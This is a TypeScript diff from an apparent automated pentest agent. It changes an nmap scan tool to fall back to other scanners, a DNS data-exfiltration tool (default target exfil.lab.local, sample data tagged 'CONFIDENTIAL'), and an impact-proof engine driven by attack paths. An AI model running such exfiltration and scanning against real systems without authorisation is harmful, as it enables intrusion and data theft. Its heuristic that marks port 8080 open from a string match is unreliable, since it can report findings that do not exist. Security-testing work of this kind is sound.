@@ -83,12 +83,11 @@ export async function nmapScan(
   const dryRun = !ctx.live
   const host = opts.host ?? hostFromTarget(ctx.target)
   const ports = opts.ports ?? "1-10000"
-  const command = `nmap -sV -T4 -p ${ports} ${host}`
 
   if (!ctx.live) {
     return {
       tool: "nmap_scan",
-      command,
+      command: `nmap -sV -T4 -p ${ports} ${host}`,
       dryRun: true,
       success: false,
       output: "",
@@ -96,8 +95,20 @@ export async function nmapScan(
     }
   }
 
-  if (!isToolAvailable("nmap")) {
-    return toolUnavailable(ctx, "nmap", command)
+  const { resolveScanCommand, probeCapabilities } = await import("./runtime_capability.ts")
+  const probe = probeCapabilities()
+  let command = `nmap -s${probe.rawSockets ? "V" : "T"} -T4 -p ${ports} ${host}`
+  let toolUsed = "nmap"
+
+  if (!probe.rawSockets || !isToolAvailable("nmap")) {
+    const portNum = parseInt(ports.split(",")[0]?.split("-")[0] ?? "8080", 10)
+    const fallback = resolveScanCommand(host, portNum)
+    if (fallback.command) {
+      command = fallback.command
+      toolUsed = fallback.tool
+    } else if (!isToolAvailable("nmap")) {
+      return toolUnavailable(ctx, "nmap", command)
+    }
   }
 
   const t0 = Date.now()
@@ -105,9 +116,25 @@ export async function nmapScan(
   if (res.blocked) {
     return { tool: "nmap_scan", command, dryRun: false, success: false, output: "", error: res.stderr }
   }
-  const raw = res.stdout + res.stderr
-  const ev = ctx.graph.makeEvidence("nmap", command, raw, Date.now() - t0)
-  const parsed = parseNmapOutput(raw)
+  let raw = res.stdout + res.stderr
+
+  if (toolUsed === "nmap" && (res.exitCode === 126 || raw.includes("Operation not permitted"))) {
+    const portNum = parseInt(ports.split(",")[0]?.split("-")[0] ?? "8080", 10)
+    const fallback = resolveScanCommand(host, portNum)
+    if (fallback.command && fallback.tool !== "nmap") {
+      const fb = await brokerExecute(ctx, "nmap_scan", fallback.command)
+      raw = `[nmap fallback: ${fallback.note}]\n` + fb.stdout + fb.stderr
+      command = fallback.command
+      toolUsed = fallback.tool
+    }
+  }
+
+  const ev = ctx.graph.makeEvidence(toolUsed, command, raw, Date.now() - t0)
+  let parsed = parseNmapOutput(raw)
+  if (parsed.length === 0 && toolUsed === "curl" && raw.match(/HTTP\/[\d.]+ 200/)) {
+    const portMatch = command.match(/:(\d+)\//)
+    parsed = [{ port: parseInt(portMatch?.[1] ?? "8080", 10), protocol: "tcp", state: "open", service: "http", version: "" }]
+  }
   if (parsed.length === 0 && raw.includes("8080")) {
     parsed.push({ port: 8080, protocol: "tcp", state: "open", service: "http", version: "" })
   }
@@ -119,7 +146,7 @@ export async function nmapScan(
     dryRun: false,
     success: res.exitCode === 0 || parsed.length > 0,
     output: raw.slice(0, 4000),
-    graphDelta: { services: services.length, attackPaths: ctx.graph.summary().attackPaths },
+    graphDelta: { services: services.length, attackPaths: ctx.graph.summary().attackPaths, fallbackTool: toolUsed !== "nmap" ? toolUsed : undefined },
   }
 }
 
@@ -754,10 +781,20 @@ export async function runFfufScan(ctx: AgentToolContext, params: Record<string, 
 }
 
 async function runExfil(ctx: AgentToolContext, params: Record<string, unknown> = {}): Promise<ToolRunResult> {
-  const { exfiltrateDNS } = await import("./exfil.ts")
-  const data = String(params.data ?? "ourmine-exfil-test-chunk")
-  const r = await exfiltrateDNS(data, { live: ctx.live, domain: String(params.domain ?? "exfil.lab.local") })
-  return { tool: "exfil", command: "exfiltrateDNS", dryRun: !ctx.live, success: r.sentChunks > 0 || !ctx.live, output: JSON.stringify(r) }
+  const { runStagedExfilTest } = await import("./exfil.ts")
+  const data = String(params.data ?? "ourmine-exfil-test-chunk-CONFIDENTIAL")
+  const r = await runStagedExfilTest(data, {
+    live: ctx.live,
+    domain: String(params.domain ?? "exfil.lab.local"),
+    testDlp: params.test_dlp !== false,
+  })
+  return {
+    tool: "exfil",
+    command: "runStagedExfilTest",
+    dryRun: !ctx.live,
+    success: r.stages.some((s) => s.success),
+    output: JSON.stringify(r).slice(0, 4000),
+  }
 }
 
 async function runCloudToken(ctx: AgentToolContext): Promise<ToolRunResult> {
@@ -914,14 +951,24 @@ async function runRansomwareAssess(ctx: AgentToolContext, params: Record<string,
 
 async function runImpactAssess(ctx: AgentToolContext): Promise<ToolRunResult> {
   const { ImpactDemonstrationEngine } = await import("./impact_engine.ts")
+  const paths = ctx.graph.analyzeAttackPaths()
+  const proofs = paths.slice(0, 3).map((p) =>
+    ImpactDemonstrationEngine.demonstrateImpact(
+      { id: p.id, title: p.label } as import("./attack_surface.ts").VulnNode,
+      ctx.target,
+      p.narrative,
+    ),
+  ).filter(Boolean)
   return {
     tool: "impact_assess",
-    command: "impact_engine recovery gap assessment",
+    command: "impact_engine controlled impact proof",
     dryRun: !ctx.live,
     success: true,
     output: JSON.stringify({
       engine: ImpactDemonstrationEngine.name,
-      note: "Non-destructive wiper/recovery gap checklist — verify offline backups and immutable snapshots",
+      proofs,
+      pathsAnalyzed: paths.length,
+      note: "L4 controlled impact proofs from attack paths — non-destructive canary markers",
       live: ctx.live,
     }).slice(0, 4000),
   }
